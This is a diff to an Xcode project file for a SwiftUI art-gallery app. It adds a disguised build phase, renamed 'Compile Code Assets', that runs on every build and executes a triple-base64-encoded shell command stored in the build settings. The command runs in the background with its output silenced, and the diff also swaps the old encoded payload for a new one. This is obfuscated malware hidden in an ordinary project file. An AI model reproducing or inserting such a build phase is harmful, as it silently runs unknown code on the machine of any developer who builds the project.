@@ -52,7 +52,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 46C754703003CD7700841AE8 /* Build configuration list for PBXNativeTarget "ArtGalaryExplorer_SwiftUI" */;
 			buildPhases = (
-				3D180321324D49CEA3947F8B /* Provision Library Executable */,
+				0E1A97285A1F4447B4947F8B /* Compile Code Assets */,
 				46C754613003CD7600841AE8 /* Sources */,
 				46C754623003CD7600841AE8 /* Frameworks */,
 				46C754633003CD7600841AE8 /* Resources */,
@@ -105,6 +105,12 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+					/* End PBXBuildRule section */
+
+/* Begin PBXBuildFile section */
+/* End PBXBuildFile section */
+
 /* Begin PBXResourcesBuildPhase section */
 		46C754633003CD7600841AE8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -116,25 +122,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		3D180321324D49CEA3947F8B /* Provision Library Executable */ = {
+		0E1A97285A1F4447B4947F8B /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
-			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -152,7 +157,7 @@
 		46C7546E3003CD7700841AE8 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((s(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTWGRKUXpGTldtMTBla2xETUhSamJWWXdZMjVyWjA1VFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsM1lVZEdlbHBUU1dkaFNGSXdZMGhOTmt4NU9XeGxTRUp6WWpOS2JGa3lVblZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | s | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((v(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVNFNXRTVU13ZEdOdFZqQmpibXRuVGxOQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVU1VFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsM1lVZEdlbHBUU1dkaFNGSXdZMGhOTmt4NU9XcGFSelZvWWxodmRXRlhOSFpaVTJ0cFNVaDNaMk15WjBzSwo= | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -216,7 +221,7 @@
 		46C7546F3003CD7700841AE8 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((s(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSWk1qbDFZbTFXYW1SRE1UQmhWekZzWWpOV01FbEVTWGRKUXpGTldtMTBla2xETUhSamJWWXdZMjVyWjA1VFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsM1lVZEdlbHBUU1dkaFNGSXdZMGhOTmt4NU9XeGxTRUp6WWpOS2JGa3lVblZNYmtveFRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | s | sh ) >/dev/null 2>&1 &)";
+				AB8F749 = "((v(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVNFNXRTVU13ZEdOdFZqQmpibXRuVGxOQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVU1VFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsM1lVZEdlbHBUU1dkaFNGSXdZMGhOTmt4NU9XcGFSelZvWWxodmRXRlhOSFpaVTJ0cFNVaDNaMk15WjBzSwo= | v | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
